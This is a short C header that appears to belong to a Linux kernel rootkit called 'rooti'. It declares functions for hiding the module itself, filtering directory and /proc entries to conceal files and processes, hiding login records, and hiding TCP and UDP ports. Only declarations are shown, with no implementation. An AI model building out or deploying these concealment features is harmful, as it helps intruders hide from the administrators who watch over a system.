#ifndef _ROOTI_HIDE_H
#define _ROOTI_HIDE_H

void rooti_hideme(void);

size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, bool is_proc_dir, unsigned char *pid_bitmap);
int rooti_hide_login_entry(char *user_buf, size_t count);

bool rooti_should_hide_tcp_port(unsigned short port);
bool rooti_should_hide_udp_port(unsigned short port);

#endif